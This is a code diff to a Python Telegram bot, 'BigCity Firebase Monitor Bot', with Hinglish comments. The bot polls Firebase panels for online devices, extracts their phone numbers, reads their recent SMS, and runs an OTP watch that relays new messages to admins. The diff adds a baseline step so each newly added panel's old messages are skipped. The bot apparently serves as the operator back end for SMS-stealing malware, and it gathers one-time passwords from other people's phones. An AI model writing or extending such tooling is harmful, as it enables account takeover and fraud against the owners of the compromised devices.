@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (Perfect Number Extractor)
+BigCity Firebase Monitor Bot (Panel Add Baseline Fix)
 """
 import asyncio
 import json
@@ -172,20 +172,16 @@ def clean_number(val: str) -> str:
     if len(digits) == 10: return digits
     return ""
 
-# ─── NUMBER EXTRACTOR (DEVICE SE DEEP SEARCH) ───────────────────────────────
 def _extract_number(d: dict) -> str:
     if not isinstance(d, dict): return ""
-    # Direct fields (jo screenshot mein the)
     for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
-    # SMS fields
     for f in ("Phone #1", "Phone_1", "phone1", "Phone #2", "Phone_2", "phone2"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
-    # Deep Nested Search
     for k, v in d.items():
         if isinstance(v, dict):
             res = _extract_number(v)
@@ -278,20 +274,16 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             mid = str(md.get("id", mk))
             key = f"{pk}:{did}:{mid}"
             
+            # Agar message pehle se memory mein hai, toh skip
             if state.get(key): continue
             
-            msg_time = 0
-            for tf in ("timestamp", "time", "dateTime"):
-                if tf in md:
-                    try:
-                        v = md[tf]
-                        msg_time = (v / 1000) if v > 1e12 else float(v)
-                        break
-                    except: pass
+            # Naya panel add hua hai? Toh pehle is panel ke saare purane messages ko read mark karo
+            init_key = f"init:{pk}"
+            if not state.get(init_key):
+                state[key] = True
+                continue
             
-            if msg_time > 0 and msg_time < BOT_START_TIME:
-                state[key] = True; continue
-                
+            # Bot start hone ke baad 10 second tak sab read mark karo
             if (time.time() - BOT_START_TIME) < BASELINE_DELAY or not IS_INITIALIZED:
                 state[key] = True; continue
             
@@ -303,8 +295,6 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
                 state[key] = True; continue
                 
             sender, dt = extract_sender_time(md)
-            
-            # Number: Pehle device se, agar N/A ho toh text se
             actual_num = num if num else extract_number_from_msg_text(text)
             
             if kind == "reward":
@@ -333,6 +323,8 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
             for pk, pc in list(panels.items()):
                 base = pc.get("base")
                 if not base: continue
+                init_key = f"init:{pk}"
+                
                 try:
                     if pc.get("device_node") is None or pc.get("message_node") is None:
                         dn, mn = await asyncio.wait_for(discover_structure(client, base), timeout=20)
@@ -342,6 +334,20 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
                     
                     online = await asyncio.wait_for(fetch_online_devices(client, base, pc.get("device_node","")), timeout=25)
                     if not online: continue
+                    
+                    # Naya panel baseline (agar naya add hua hai)
+                    if not state.get(init_key):
+                        for did, _ in online:
+                            try: 
+                                msgs = await asyncio.wait_for(fetch_last_messages(client, base, pc.get("message_node",""), did, limit=15), timeout=15)
+                                for mk, md in msgs.items():
+                                    if isinstance(md, dict): 
+                                        state[f"{pk}:{did}:{str(md.get('id', mk))}"] = True
+                            except Exception: pass
+                        state[init_key] = True
+                        save_state(state)
+                        logger.info(f"Panel {pk} baseline done.")
+                        continue
                     
                     tasks = [process_device(client, pk, pc, did, num, state, admins, app) for did, num in online]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -402,7 +408,6 @@ async def otp_watch(app, chat_id, pk, did):
             for mk, md in (await fetch_last_messages(client, base, msg_node, did, limit=15)).items():
                 if isinstance(md, dict): seen.add(str(md.get("id", mk)))
             
-            # Fetch exact number for watch
             dev_num = ""
             try:
                 path = f"/{pc.get('device_node','')}" if pc.get("device_node") else ""
